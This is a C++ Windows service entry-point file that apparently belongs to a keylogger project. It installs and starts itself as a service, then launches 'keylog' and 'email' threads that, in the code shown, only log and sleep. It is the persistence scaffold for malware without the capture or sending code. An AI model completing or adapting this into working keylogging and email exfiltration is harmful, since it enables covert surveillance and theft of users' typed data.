//  Service.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "KeyLogManager.h"
#include "ServiceManager.h"

#define		MAX_NUM_OF_PROCESS		4
/** Window Service **/
VOID ServiceMainProc();

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);
VOID WINAPI ServiceHandler(DWORD fdwControl);

void start_working_thread();
void stop_working_thread();
DWORD WINAPI keylog_thread(LPVOID info);
DWORD WINAPI email_thread(LPVOID info);
bool is_service_env();
void install_service();
HANDLE keylog_tid;
HANDLE email_tid;
bool running = false;

/** Window Service **/
const int nBufferSize = 500;
CHAR pServiceName[nBufferSize+1];

SERVICE_TABLE_ENTRY lpServiceStartTable[] = 
{
	{pServiceName, ServiceMain},
	{NULL, NULL}
};

SERVICE_STATUS_HANDLE   hServiceStatusHandle; 
SERVICE_STATUS          ServiceStatus; 

int _tmain(int argc, _TCHAR* argv[])
{
	strcpy(pServiceName,"Sundar_Service");	
	bool is_service = is_service_env();
	if(is_service){
		ServiceMainProc();
	} else{
		install_service();
	}
	return 0;
}

void install_service(){
	ServiceManager sm;	
	char exe_path[MAX_PATH];
	DWORD size = GetModuleFileName(NULL, exe_path, sizeof(exe_path));
	exe_path[size] = 0;
	sm.uninstall(pServiceName);
	sm.install(exe_path, pServiceName);
	bool ret = sm.run_service(pServiceName);
	if(ret){
		Logger::debug("Service %s Install And Run Succ", pServiceName);
	} else{
		Logger::debug("Service %s Install And Run Fail", pServiceName);
	}
}

bool is_service_env(){
	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
	return handle == 0;
}

VOID ServiceMainProc()
{
	//start serivce
	if(!StartServiceCtrlDispatcher(lpServiceStartTable)) {
		Logger::debug("StartServiceCtrlDispatcher failed, error code = %d\n", GetLastError());
	}
}

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
	DWORD   status = 0; 
    DWORD   specificError = 0xfffffff; 
 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE; 
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hServiceStatusHandle = RegisterServiceCtrlHandler(pServiceName, ServiceHandler); 
    if (hServiceStatusHandle==0) {
		Logger::debug("RegisterServiceCtrlHandler failed, error code = %d\n", GetLastError());
        return; 
    } 
 
    // Initialization complete - report running status 
    ServiceStatus.dwCurrentState       = SERVICE_RUNNING; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0;  
    if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError()); 
    } 

	// AttachProcessNames();
	// for(int iLoop = 0; iLoop < MAX_NUM_OF_PROCESS; iLoop++)
	// {
	// 	pProcInfo[iLoop].hProcess = 0;
	// 	StartProcess(iLoop);
	// }
	start_working_thread();
}

DWORD WINAPI keylog_thread(LPVOID info){
	while(running){
		Logger::debug("Keylog Thread Running");
		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI email_thread(LPVOID info){
	while(running){
		Logger::debug("Email Thread Running");
		Sleep(1000);
	}
	return 0;
}

void start_working_thread(){
	if(running){
		return;
	}
	running = true;
	keylog_tid = CreateThread(NULL, 0, keylog_thread, NULL, 0, NULL);
	email_tid = CreateThread(NULL, 0, email_thread, NULL, 0, NULL);
	if(!keylog_tid || !email_tid){
		running = false;
		Logger::debug("Create Working Thread Fail");
	}
}
void stop_working_thread(){
	running = false;
}

VOID WINAPI ServiceHandler(DWORD fdwControl)
{
	switch(fdwControl) 
	{
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			ServiceStatus.dwWin32ExitCode = 0; 
			ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
			ServiceStatus.dwCheckPoint    = 0; 
			ServiceStatus.dwWaitHint      = 0;
			// terminate all processes started by this service before shutdown
			{
				stop_working_thread();		
			}
			break; 
		case SERVICE_CONTROL_PAUSE:
			ServiceStatus.dwCurrentState = SERVICE_PAUSED; 
			break;
		case SERVICE_CONTROL_CONTINUE:
			ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
		default:
			Logger::debug("Unrecognized opcode %d\n", fdwControl);
	};
    if (!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError());
    } 
}
